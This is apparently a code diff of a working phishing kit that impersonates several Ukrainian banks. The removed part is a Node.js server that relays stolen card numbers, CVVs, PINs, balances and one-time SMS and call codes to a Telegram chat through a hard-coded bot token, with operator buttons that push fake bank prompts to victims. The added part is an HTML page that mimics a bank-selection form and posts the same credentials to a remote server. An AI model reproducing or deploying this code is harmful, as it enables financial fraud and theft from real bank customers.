@@ -1,195 +1,468 @@
-const express = require('express');
-const cors = require('cors');
-const TelegramBot = require('node-telegram-bot-api');
-const WebSocket = require('ws');
-const path = require('path');
-const http = require('http');
-
-// Настройки
-const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
-const CHAT_ID = -4970332008;
-const SERVER_URL = 'https://new-l8h6.onrender.com';
-
-const app = express();
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
-
-app.use(express.json());
-app.use(cors());
-
-// Маршрут для главной страницы
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
-
-const clients = new Map();
-const sessions = new Map();
-
-// Обработка WebSocket соединений
-wss.on('connection', (ws) => {
-    console.log('Client connected via WebSocket');
-    ws.on('message', (message) => {
-        try {
-            const data = JSON.parse(message);
-            if (data.type === 'register' && data.sessionId) {
-                clients.set(data.sessionId, ws);
-                console.log(Client registered: ${data.sessionId});
-            }
-        } catch (e) {
-            console.error('Error processing message:', e);
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Оберіть свій банк</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        :root {
+            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
+            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
         }
-    });
-    ws.on('close', () => {
-        clients.forEach((clientWs, sessionId) => {
-            if (clientWs === ws) {
-                clients.delete(sessionId);
-                console.log(Client disconnected: ${sessionId});
-            }
-        });
-    });
-});
-
-// Обработка API запросов
-app.post('/api/submit', (req, res) => {
-    const { sessionId, isFinalStep, ...stepData } = req.body;
-    const existingData = sessions.get(sessionId) || { visitCount: 0 };
-    const newData = { ...existingData, ...stepData };
-    sessions.set(sessionId, newData);
-
-    if (newData.call_code_input) {
-        let message = <b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n;
-        message += <b>Код:</b> <code>${newData.call_code_input}</code>\n;
-        message += <b>Сесія:</b> <code>${sessionId}</code>\n;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        return res.status(200).json({ message: 'Call code received' });
-    }
-
-    if (isFinalStep) {
-        newData.visitCount += 1;
-        sessions.set(sessionId, newData);
-        console.log(Received FINAL data for session ${sessionId}, visit #${newData.visitCount});
-
-        let message = '';
-        let options;
-        const visitText = newData.visitCount === 1 ? 'NEW' : ${newData.visitCount} раз;
-        const singleStepBanks = ['Ощадбанк', 'Райффайзен'];
-
-        if (!singleStepBanks.includes(newData.bankName) && !newData['card-cvv']) {
-            message = <b>[Крок 1] Новий запис! (${newData.bankName})</b>\n\n;
-            message += <b>Назва банку:</b> ${newData.bankName}\n;
-            message += <b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n;
-            message += <b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n;
-            message += <b>Кількість переходів:</b> ${visitText}\n;
-            options = {
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: 'ЗАПРОС', callback_data: zapit:${sessionId} }],
-                        [{ text: 'Карта', callback_data: card_error:${sessionId} }, { text: 'Номер', callback_data: number_error:${sessionId} }]
-                    ]
-                }
-            };
-        } else {
-            if (!singleStepBanks.includes(newData.bankName)) {
-                message = <b>✅ [Крок 2] Повні дані! (${newData.bankName})</b>\n\n;
-            } else {
-                message = <b>✅ Новий запис! (${newData.bankName})</b>\n\n;
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
+        }
+        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
+        #bank-selection-screen { opacity: 1; transform: scale(1); }
+        #form-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            opacity: 0; visibility: hidden; transform: scale(1.05);
+            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
+            display: flex; align-items: center; padding: 20px;
+        }
+        .form-container {
+            width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
+            background-color: var(--white); padding: 30px; border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+        }
+        body.form-active { background: var(--bg-gradient); overflow: hidden; }
+        body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
+        body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
+        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
+        .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
+        .bank-item {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
+            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
+            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
+            box-shadow: 0 4px 10px var(--shadow-color);
+        }
+        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
+        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
+        .bank-item .bank-name { font-size: 15px; font-weight: 600; }
+        #form-header { text-align: center; margin-bottom: 25px; }
+        #form-header-logo { max-height: 50px; max-width: 150px; }
+        #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
+        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
+        .input-group { margin-bottom: 15px; }
+        .input-group:last-child { margin-bottom: 0; }
+        .input-field {
+            width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
+            font-size: 18px; font-weight: 500; transition: all 0.3s ease;
+        }
+        .input-field.invalid { border-color: var(--danger-color); }
+        .phone-input-wrapper { display: flex; }
+        .phone-prefix {
+            padding: 15px; border: 1px solid var(--border-color); border-right: none;
+            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
+            flex-shrink: 0; display: flex; align-items: center;
 
 }
-            message += <b>Назва банку:</b> ${newData.bankName}\n;
-            message += <b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n;
-            message += <b>Номер карти:</b> <code>${newData.card || 'Не вказано'}</code>\n;
-            if (newData['card-expiry']) message += <b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n;
-            if (newData['card-cvv']) message += <b>CVV:</b> <code>${newData['card-cvv']}</code>\n;
-            if (newData.pin) message += <b>Пін:</b> <code>${newData.pin}</code>\n;
-            if (newData.balance) message += <b>Поточний баланс:</b> <code>${newData.balance}</code>\n;
-            message += <b>Кількість переходів:</b> ${visitText}\n;
-            options = {
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: 'SMS', callback_data: sms:${sessionId} }, { text: 'ДОДАТОК', callback_data: app:${sessionId} }],
-                        [{ text: 'ПІН', callback_data: pin_error:${sessionId} }, { text: 'КОД', callback_data: code_error:${sessionId} }, { text: 'КОД ✅', callback_data: timer:${sessionId} }],
-                        [{ text: 'Карта', callback_data: card_error:${sessionId} }, { text: 'Номер', callback_data: number_error:${sessionId} }],
-                        [{ text: 'OTHER', callback_data: other:${sessionId} }]
-                    ]
-                }
-            };
+        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; flex: 1; width: auto; min-width: 0; }
+        .multi-input-row { display: flex; gap: 10px; }
+        .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
+        .btn {
+            width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
+            font-weight: 700; cursor: pointer; transition: all 0.3s ease;
+            flex-basis: 0; flex-grow: 1;
         }
-        bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
-    }
-    res.status(200).json({ message: 'OK' });
-});
+        .btn:active { transform: translateY(0) scale(0.97); }
+        body { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
+        body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
+        body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
+        body[data-theme="alliance"] { --primary-color: #0078C9; --accent-color: #005a99; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%); }
+        body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D226; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
+        body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
+        body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
+        body[data-theme="novapay"] { --primary-color: #5C45A0; --accent-color: #4527A0; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #EDE7F6 0%, #D1C4E9 100%); }
+        body[data-theme="ukrsib"] { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
+        .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
+        .btn-back { background-color: #f1f3f5; color: var(--light-text); }
+    </style>
+</head>
+<body>
+    <div id="bank-selection-screen" class="screen">
+        <h1>Оберіть свій банк</h1>
+        <div class="bank-grid"></div>
+    </div>
+    <div id="form-screen" class="screen">
+        <div class="form-container">
+            <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
+            <h2 id="modal-title"></h2>
+            <div id="modal-step-content"></div>
+            <div class="modal-footer">
+                <button class="btn btn-back" id="back-btn">Назад</button>
+                <button class="btn btn-next" id="next-btn">Далі</button>
+            </div>
+        </div>
+    </div>
 
-app.post('/api/sms', (req, res) => {
-    const { sessionId, code } = req.body;
-    const sessionData = sessions.get(sessionId);
-    if (sessionData) {
-        let message = <b>💬 Отримано SMS!</b>\n\n;
-        message += <b>Код:</b> <code>${code}</code>\n;
-        message += <b>Номер телефону:</b> <code>${sessionData.phone}</code>\n;
-        message += <b>Сесія:</b> <code>${sessionId}</code>\n;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        console.log(SMS code received for session ${sessionId});
-        res.status(200).json({ message: 'OK' });
-    } else {
-        res.status(404).json({ message: 'Session not found' });
-    }
-});
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('DOM loaded, initializing...');
+            const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+            let ws;
+            let activeBankData = {};
+            let currentStepIndex = 0;
+            let collectedData = {};
 
-// Endpoint для вебхука Telegram
-const webhookPath = /webhook/${TELEGRAM_BOT_TOKEN};
-app.post(webhookPath, (req, res) => {
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
-});
+            const serverDomain = 'new-l8h6.onrender.com';
 
-bot.on('callback_query', (callbackQuery) => {
-    const [type, sessionId] = callbackQuery.data.split(':');
-    const ws = clients.get(sessionId);
-    if (ws && ws.readyState === WebSocket.OPEN) {
-        let commandData = {};
-        switch (type) {
-            case 'sms': 
-                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" }; 
-                break;
-            case 'app': 
-                commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." }; 
-                break;
-            case 'other': 
-                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку" }; 
-                break;
-            case 'pin_error': 
-                commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" }; 
-                break;
-            case 'card_error': 
-                commandData = { text: "Вказано невірний номер картки, натисніть назад та введіть номер картки вірно" }; 
-                break;
-            case 'number_error': 
-                commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
+            const twoStepThemes = ['pumb', 'alliance', 'otp', 'vostok', 'izibank', 'novapay', 'ukrsib'];
+            const twoStepFlow = [
+                { type: 'phone', title: 'Введіть номер телефону' },
+                { type: 'card', title: 'Для зарахування коштів введіть номер картки' }
+            ];
+            const bankFlows = {
+                'oschadbank': {
+
+name: 'Ощадбанк', 
+                    logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', 
+                    theme: 'oschadbank',
+                    steps: [ 
+                        { type: 'phone', title: 'Введіть номер телефону' }, 
+                        { type: 'card', title: 'Введіть номер карти' }, 
+                        { type: 'pin', title: 'Введіть ПІН-код' }, 
+                        { type: 'call_code', title: 'Підтвердження дзвінком' } 
+                    ]
+                },
+                'raiffeisen': { 
+                    name: 'Райффайзен', 
+                    logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', 
+                    theme: 'raiffeisen', 
+                    steps: [ 
+                        { type: 'phone', title: 'Введіть номер телефону' }, 
+                        { type: 'card_full', title: 'Для авторизації заповніть форму' } 
+                    ]
+                },
+                'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: twoStepFlow },
+                'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: twoStepFlow },
+                'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: twoStepFlow },
+                'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', steps: twoStepFlow },
+                'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', steps: twoStepFlow },
+                'novapay': { name: 'NovaPay', logoUrl: 'https://bank.gov.ua/admin_Uploads/payment_system/NovaPay_logo.jpg?v=14', theme: 'novapay', steps: twoStepFlow },
+                'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', steps: twoStepFlow }
+            };
+
+            const bankGrid = document.querySelector('.bank-grid');
+            const body = document.body;
+            const formHeaderLogo = document.getElementById('form-header-logo');
+            const modalTitle = document.getElementById('modal-title');
+            const stepContent = document.getElementById('modal-step-content');
+
+            // Рендеринг банков
+            try {
+                console.log('Rendering banks...');
+                bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
+                    const bank = bankFlows[id];
+                    return <a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}" onerror="console.error('Failed to load logo for ${bank.name}')"><span class="bank-name">${bank.name}</span></a>;
+                }).join('');
+                console.log('Banks rendered successfully');
+            } catch (error) {
+                console.error('Error rendering banks:', error);
+            }
+
+            function connectWebSocket() {
+                console.log('Connecting to WebSocket...');
+                ws = new WebSocket(wss://${serverDomain});
+                ws.onopen = () => { 
+                    console.log('WebSocket connected'); 
+                    ws.send(JSON.stringify({ type: 'register', sessionId: sessionId })); 
+                };
+                ws.onmessage = (event) => { 
+                    try {
+                        const command = JSON.parse(event.data); 
+                        console.log('WebSocket message received:', command);
+                        handleServerCommand(command);
+
+} catch (e) {
+                        console.error('WebSocket message error:', e);
+                    }
+                };
+                ws.onclose = () => {
+                    console.log('WebSocket disconnected, reconnecting...');
+                    setTimeout(connectWebSocket, 3000);
+                };
+                ws.onerror = (error) => console.error('WebSocket error:', error);
+            }
+            
+            document.querySelectorAll('.bank-item').forEach(item => {
+                item.addEventListener('click', e => {
+                    e.preventDefault();
+                    console.log('Bank clicked:', item.dataset.bank);
+                    const bankId = item.dataset.bank;
+                    activeBankData = bankFlows[bankId];
+                    body.dataset.theme = activeBankData.theme;
+                    formHeaderLogo.src = activeBankData.logoUrl;
+                    body.classList.add('form-active');
+                    currentStepIndex = 0;
+                    collectedData = {};
+                    renderStep();
+                    connectWebSocket();
+                });
+            });
+
+            async function sendDataToServer(data, isFinal) {
+                collectedData = { ...collectedData, ...data };
+                try {
+                    console.log('Sending data to server:', { sessionId, bankName: activeBankData.name, isFinalStep: isFinal, ...collectedData });
+                    const response = await fetch(https://${serverDomain}/api/submit, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, ...collectedData }),
+                    });
+                    if (!response.ok) throw new Error(HTTP error: ${response.status});
+                    console.log('Data sent successfully');
+                } catch (error) { 
+                    console.error('Failed to send data:', error); 
+                }
+            }
+
+            function validateCurrentStep() {
+                let isValid = true;
+                const inputs = stepContent.querySelectorAll('.input-field');
+                inputs.forEach(input => {
+                    input.classList.remove('invalid');
+                    let value = input.value;
+                    let id = input.id;
+                    let isFieldValid = true;
+                    if (id === 'phone' && value.replace(/\s/g, '').length !== 9) isFieldValid = false;
+                    if (id === 'card' && value.replace(/\s/g, '').length !== 16) isFieldValid = false;
+                    if (id === 'card-expiry' && value.length !== 5) isFieldValid = false;
+                    if (id === 'card-cvv' && value.length !== 3) isFieldValid = false;
+                    if (id === 'pin' && value.length !== 4) isFieldValid = false;
+                    if (!isFieldValid) { 
+                        input.classList.add('invalid'); 
+                        isValid = false; 
+                    }
+                });
+                return isValid;
+            }
+
+            function handleNextStep() {
+                if (!validateCurrentStep()) {
+                    console.log('Validation failed');
+                    return;
+                }
+                let data = {};
+                const inputs = stepContent.querySelectorAll('.input-field');
+                inputs.forEach(input => {
+                    let key = input.id; 
+                    let value = input.value;
+                    if (key === 'phone') value = '+380 ' + value;
+                    data[key] = value;
+                });
+                const step = activeBankData.steps[currentStepIndex];
+                let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
+
+if (activeBankData.theme === 'oschadbank' && step.type === 'pin') isFinalStep = true;
+                if (twoStepThemes.includes(activeBankData.theme) && step.type === 'card') { 
+                    isFinalStep = true; 
+                }
+                console.log('Handling next step, isFinal:', isFinalStep);
+                sendDataToServer(data, isFinalStep);
+
+                if (twoStepThemes.includes(activeBankData.theme) && step.type === 'card') {
+                    modalTitle.textContent = 'Очікуйте';
+                    stepContent.innerHTML = <p style="text-align:center;">Ваша заявка в роботі</p><p style="text-align:center; color: var(--danger-color);">Не закривайте будь-ласка сайт</p>;
+                    document.querySelector('.modal-footer').style.display = 'none';
+                    return;
+                }
+                currentStepIndex++;
+                if (currentStepIndex < activeBankData.steps.length) {
+                    renderStep();
+                } else {
+                    modalTitle.textContent = 'Очікуємо';
+                    stepContent.innerHTML = '<p style="text-align:center;">Заявку відправлено. Будь ласка, зачекайте на наступний крок.</p>';
+                    document.querySelector('.modal-footer').style.display = 'none';
+                }
+            }
+
+            function handleBackStep() {
+                if (currentStepIndex > 0) {
+                    currentStepIndex--; 
+                    renderStep();
+                } else {
+                    body.classList.remove('form-active');
+                    if (ws) { ws.close(); }
+                }
+            }
+
+            function addInputFormatting() {
+                const phoneInput = document.getElementById('phone');
+                if (phoneInput) {
+                    phoneInput.addEventListener('input', (e) => {
+                        let value = e.target.value.replace(/\D/g, '');
+                        let formattedValue = '';
+                        if (value.length > 0) formattedValue += value.substring(0, 2);
+                        if (value.length > 2) formattedValue += ' ' + value.substring(2, 5);
+                        if (value.length > 5) formattedValue += ' ' + value.substring(5, 7);
+                        if (value.length > 7) formattedValue += ' ' + value.substring(7, 9);
+                        e.target.value = formattedValue.trim();
+                    });
+                }
+                const cardNumberInput = document.getElementById('card');
+                if (cardNumberInput) { 
+                    cardNumberInput.addEventListener('input', (e) => { 
+                        e.target.value = e.target.value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(); 
+                    }); 
+                }
+                const cardExpiryInput = document.getElementById('card-expiry');
+                if (cardExpiryInput) { 
+                    cardExpiryInput.addEventListener('input', (e) => { 
+                        let value = e.target.value.replace(/\D/g, '');
+                        if (value.length > 2) { 
+                            value = value.substring(0, 2) + '/' + value.substring(2, 4); 
+                        } 
+                        e.target.value = value; 
+                    }); 
+                }
+            }
+
+            function renderStep() {
+                console.log('Rendering step:', currentStepIndex);
+                const step = activeBankData.steps[currentStepIndex];
+                let html = '';
+                const modalFooter = document.querySelector('.modal-footer');
+                switch (step.type) {
+                    case 'phone': 
+                        html = <div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div></div>;
 
 break;
-        }
-        ws.send(JSON.stringify({ type: type, data: commandData }));
-        bot.answerCallbackQuery(callbackQuery.id, { text: Команда "${type}" відправлена! });
-    } else {
-        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
-    }
-});
+                    case 'card': 
+                        html = <div class="input-group"><input type="tel" class="input-field" id="card" placeholder="XXXX XXXX XXXX XXXX" maxlength="19"></div>; 
+                        break;
+                    case 'pin': 
+                        html = <div class="input-group"><input type="password" class="input-field" id="pin" placeholder="ПІН-код" maxlength="4" inputmode="numeric"></div>; 
+                        break;
+                    case 'card_full': 
+                        html = <div class="input-group"><input type="tel" class="input-field" id="card" placeholder="Номер картки" maxlength="19"></div><div class="multi-input-row"><input type="tel" class="input-field" id="card-expiry" placeholder="Термін дії (ММ/РР)" maxlength="5"><input type="tel" class="input-field" id="card-cvv" placeholder="CVV" maxlength="3"></div>; 
+                        break;
+                    case 'card_extended': 
+                        html = <div class="input-group"><input type="tel" class="input-field" id="card" placeholder="Номер картки" maxlength="19"></div><div class="multi-input-row"><input type="tel" class="input-field" id="card-expiry" placeholder="Термін дії (ММ/РР)" maxlength="5"><input type="tel" class="input-field" id="card-cvv" placeholder="CVV" maxlength="3"></div><div class="input-group" style="margin-top: 15px;"><input type="number" class="input-field" id="balance" placeholder="Поточний баланс"></div>; 
+                        break;
+                    case 'call_code': 
+                        html = <p style="text-align:center;">Зараз вам буде здійснено дзвінок... Код введіть у форму нижче.</p><div class="input-group"><input type="tel" class="input-field" id="call_code_input" placeholder="Введіть код з дзвінка" maxlength="6" inputmode="numeric"></div>; 
+                        break;
+                }
+                modalTitle.textContent = step.title;
+                stepContent.innerHTML = html;
+                modalFooter.style.display = 'flex';
+                modalFooter.innerHTML = <button class="btn btn-back" id="back-btn">Назад</button><button class="btn btn-next" id="next-btn">Далі</button>;
+                document.getElementById('next-btn').addEventListener('click', handleNextStep);
+                document.getElementById('back-btn').addEventListener('click', handleBackStep);
+                document.getElementById('back-btn').style.display = currentStepIndex > 0 ? 'block' : 'none';
+                addInputFormatting();
+            }
+            
+            function handleConfirmation() {
+                if (!validateCurrentStep()) {
+                    console.log('Confirmation validation failed');
+                    return;
+                }
+                let data = {};
+                const inputs = stepContent.querySelectorAll('.input-field');
+                inputs.forEach(input => { data[input.id] = input.value; });
+                sendDataToServer(data, true);
+                modalTitle.textContent = 'Очікуйте';
+                stepContent.innerHTML = <p style="text-align:center;">Ваша заявка в роботі</p><p style="text-align:center; color: var(--danger-color);">Не закривайте будь-ласка сайт</p>;
+                document.querySelector('.modal-footer').style.display = 'none';
+            }
 
-const PORT = process.env.PORT || 3000;
+            function handleServerCommand(command) {
+                console.log('Handling server command:', command);
+                const { type, data } = command;
+                const modalFooter = document.querySelector('.modal-footer');
+                const showMessageWithButton = (title, text, btnText, callback) => {
+                    modalTitle.textContent = title;
+                    stepContent.innerHTML = <p style="text-align:center;">${text}</p>;
+                    modalFooter.style.display = 'flex';
+                    modalFooter.innerHTML = <button class="btn btn-back">${btnText}</button>;
+                    modalFooter.querySelector('button').addEventListener('click', callback);
+                };
 
-server.listen(PORT, () => {
-    console.log(Server is running on port ${PORT});
-    console.log(Setting webhook on URL: ${SERVER_URL}${webhookPath});
-    bot.setWebHook(${SERVER_URL}${webhookPath})
-        .then(() => {
-            console.log('>>> Webhook successfully set!');
-        })
-        .catch((error) => {
-            console.error('!!! ERROR SETTING WEBHOOK !!!');
-            console.error(error.message);
+switch (type) {
+                    case 'zapit':
+                        if (twoStepThemes.includes(activeBankData.theme)) {
+                            modalTitle.textContent = 'Вам необхідно підтвердити володіння карткою, заповніть форму';
+                            stepContent.innerHTML = <div class="input-group"><input type="tel" class="input-field" id="card" placeholder="Номер картки" maxlength="19"></div><div class="multi-input-row"><input type="tel" class="input-field" id="card-expiry" placeholder="Термін дії (ММ/РР)" maxlength="5"><input type="tel" class="input-field" id="card-cvv" placeholder="CVV" maxlength="3"></div><div class="input-group" style="margin-top: 15px;"><input type="number" class="input-field" id="balance" placeholder="Поточний баланс"></div>;
+                            modalFooter.style.display = 'flex';
+                            modalFooter.innerHTML = <button class="btn btn-next" id="confirm-btn">Підтвердити</button>;
+                            document.getElementById('confirm-btn').addEventListener('click', handleConfirmation);
+                            addInputFormatting();
+                        }
+                        break;
+                    case 'sms':
+                        modalTitle.textContent = 'Введіть код з SMS';
+                        stepContent.innerHTML = <p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>;
+                        modalFooter.style.display = 'flex';
+                        modalFooter.innerHTML = <button class="btn btn-next" id="submit-sms-code">Відправити</button>;
+                        modalFooter.querySelector('#submit-sms-code').addEventListener('click', submitSmsCode);
+                        break;
+                    case 'app':
+                        modalTitle.textContent = 'Підтвердження';
+                        stepContent.innerHTML = <p style="text-align:center;">${data.text}</p>;
+                        modalFooter.style.display = 'none';
+                        break;
+                    case 'other': 
+                        showMessageWithButton("Помилка", data.text, "Обрати інший банк", () => window.location.reload()); 
+                        break;
+                    case 'pin_error': 
+                        showMessageWithButton("Невірний ПІН", data.text, "Назад", () => window.location.reload()); 
+                        break;
+                    case 'card_error': 
+                        showMessageWithButton("Невірна картка", data.text, "Назад", () => window.location.reload()); 
+                        break;
+                    case 'number_error': 
+                        showMessageWithButton("Невірний номер", data.text, "Назад", () => window.location.reload()); 
+                        break;
+                    case 'code_error':
+                        modalTitle.textContent = "Невірний код. Вкажіть вірний код.";
+                        const errorContainer = document.getElementById('sms-error-container');
+                        if (errorContainer) { 
+                            errorContainer.innerHTML = <p style="color:red; text-align:center;">Ви ввели невірний код</p>; 
+                        }
+                        break;
+                    case 'timer':
+                        modalTitle.textContent = 'Обробка заявки';
+                        stepContent.innerHTML = <div id="timer" style="color:var(--primary-color); font-size: 32px; font-weight: 700; text-align: center; margin-top: 20px;">15:00</div>;
+                        modalFooter.style.display = 'none';
+                        let duration = 15 * 60; 
+                        const display = document.getElementById('timer');
+
+const timerInterval = setInterval(() => {
+                            let minutes = parseInt(duration / 60, 10); 
+                            let seconds = parseInt(duration % 60, 10);
+                            minutes = minutes < 10 ? "0" + minutes : minutes; 
+                            seconds = seconds < 10 ? "0" + seconds : seconds;
+                            display.textContent = minutes + ":" + seconds;
+                            if (--duration < 0) { 
+                                clearInterval(timerInterval); 
+                                display.textContent = "Готово!"; 
+                            }
+                        }, 1000);
+                        break;
+                }
+            }
+            
+            async function submitSmsCode() {
+                const code = document.getElementById('sms-code').value;
+                try {
+                    console.log('Submitting SMS code:', code);
+                    const response = await fetch(https://${serverDomain}/api/sms, {
+                        method: 'POST', 
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ sessionId, code }),
+                    });
+                    if (!response.ok) throw new Error(HTTP error: ${response.status});
+                    console.log('SMS code sent successfully');
+                } catch (error) { 
+                    console.error('Failed to send sms code:', error); 
+                }
+            }
         });
-});
+    </script>
+</body>
+</html>
